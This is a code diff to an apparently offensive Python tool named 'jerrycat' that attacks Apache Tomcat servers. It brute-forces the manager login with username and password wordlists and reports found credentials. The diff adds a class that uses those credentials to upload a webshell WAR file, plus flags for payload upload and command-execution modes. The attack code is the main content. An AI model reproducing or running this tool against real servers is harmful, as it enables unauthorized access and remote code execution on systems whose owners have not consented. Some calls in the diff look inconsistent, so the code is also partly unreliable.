@@ -78,10 +78,10 @@ class output_class:
     def __init__(self):
         self.description = ""
 
-    def message(self, state: str, description: str, clear_previous_line: bool) -> None:
+    def message(self, state: str, description: str, clear_before: bool) -> None:
         self.description = description
 
-        if clear_previous_line:
+        if clear_before:
             sys.stdout.write("\033[F")  # back to previous line
             sys.stdout.write("\033[K")  # clear line
 
@@ -106,9 +106,9 @@ class output_class:
         text.append(self.description)
         console.print(text)
 
-    def verbose(self, state: str, description: str, clear_previous_line: bool) -> None:
+    def verbose(self, state: str, description: str, clear_before: bool) -> None:
         if args.verbose:
-            self.message(state, description, clear_previous_line)
+            self.message(state, description, clear_before)
 
 
 # Tomcat class
@@ -120,17 +120,17 @@ class tomcat:
         auth = HTTPBasicAuth(username, password)
         response = requests.get(f"{self.url}/manager/html", auth=auth)
         if response.status_code == 200:
-            output.verbose(state="success", description=f"{username}:{password}", clear_previous_line=False)
+            output.message(state="success", description=f"{username}:{password}", clear_before=False)
             return username, password
         else:
-            output.verbose(state="failed", description=f"{username}:{password}", clear_previous_line=False)
+            output.verbose(state="failed", description=f"{username}:{password}", clear_before=False)
             return None
 
     def version_detection(self):
         response = requests.get(f"{self.url}")
         version = re.search(r"(\d.\d.\d\d)", response.text)[1]
 
-        output.message(state="info", description=f"version: {version}", clear_previous_line=False)
+        output.message(state="info", description=f"version: {version}", clear_before=False)
 
         return version
 
@@ -148,7 +148,7 @@ class unauthenticated_attack(tomcat):
             with open(self.userlist, 'r') as file:
                 self.userlist = file.read().splitlines()
 
-        output.message(state="ongoing", description="Brute force is running...", clear_previous_line=False)
+        output.message(state="ongoing", description="Brute force is running...", clear_before=False)
 
         with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
             passwords = open_wordlist.readlines()
@@ -170,12 +170,29 @@ class unauthenticated_attack(tomcat):
                     new_credentials = {'username': result[0], 'password': result[1]}
                     credentials.append(new_credentials)
 
-            output.message(state="success", description="Brute force done!", clear_previous_line=True)
+            output.message(state="success", description="Brute force done!", clear_before=False)
 
             if credentials:
                 return credentials
 
         return False
+
+
+class authenticated_attack(tomcat):
+    def __init__(self, url: str, username: str, password: str):
+        super().__init__(url)
+        self.username = username
+        self.password = password
+
+    def upload(self, payload_path) -> str:
+        if payload_path is None:
+            payload_path = './webshell/webshell.war'
+
+        with open(payload_path, "rb") as file:
+            files = {'file': file}
+            auth = (self.username, self.password)
+            response = requests.post(self.url, files=files, auth=auth)
+            return response.text
 
 
 def main():
@@ -184,6 +201,8 @@ def main():
     parser = argparse.ArgumentParser(description="jerrycat the good guy !")
     group = parser.add_mutually_exclusive_group()
     group.add_argument("-v", "--verbose", action="store_true", default=False)
+
+    group.add_argument("--payload")
 
     # choose mode
     parser.add_argument("mode", choices=["brute", "exec", "reverse"],
@@ -234,19 +253,14 @@ def main():
 
                 if not credentials_found:
                     output.message("failed", f"No user or password is matching ! :(", False)
-                else:
-                    for credential in credentials_found:
-                        username_found = credential.get('username')
-                        password_found = credential.get('password')
 
-                        output.message("success", f"Find user and password : {username_found}:{password_found}",
-                                       False)
         # settings for exec mode
         case 'exec':
             if not all([args.url, args.user, args.password]):
                 parser.error("-u, -U, -p arguments are requires for this mode.")
             else:
-                print("Command execution mode selected")
+                webshell = authenticated_attack(url=args.url, username=args.user, password=args.password)
+                webshell.login(username=args.user, password=args.password)
 
         # settings for reverse mode
         case 'reverse':
